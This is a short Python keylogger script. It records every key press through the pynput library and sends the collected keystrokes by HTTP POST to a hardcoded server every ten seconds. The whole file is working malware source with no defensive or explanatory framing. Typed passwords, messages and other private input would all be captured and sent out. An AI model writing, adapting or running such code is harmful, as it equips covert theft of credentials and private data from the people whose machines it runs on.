import requests
import time
from pynput.keyboard import Listener

# The server URL where the data will be sent
server_url = 'http://192.168.15.16:5000'

# A buffer to store the captured keystrokes
keystroke_buffer = []

# Time interval (in seconds) to send data to the server
send_interval = 10  # Send every 10 seconds

def send_data():
    """Send the collected keystrokes to the server."""
    global keystroke_buffer

    if keystroke_buffer:
        try:
            # Join all keystrokes into a single string and send as POST data
            data = ''.join(keystroke_buffer)
            requests.post(url=server_url, data=data.encode('utf-8'))
            print(f"Sent {len(keystroke_buffer)} keystrokes to the server.")
        except Exception as e:
            print(f"Failed to send data: {e}")

        # Clear the buffer after sending
        keystroke_buffer = []

def on_press(key):
    """Callback function to capture each key press."""
    try:
        # Append the pressed key to the buffer
        keystroke_buffer.append(str(key))
    except:
        pass

def keylogger():
    """Function to start the keylogger and periodically send data."""
    # Start the keylogger listener
    with Listener(on_press=on_press) as listener:
        while True:
            time.sleep(send_interval)
            send_data()

if __name__ == '__main__':
    keylogger()
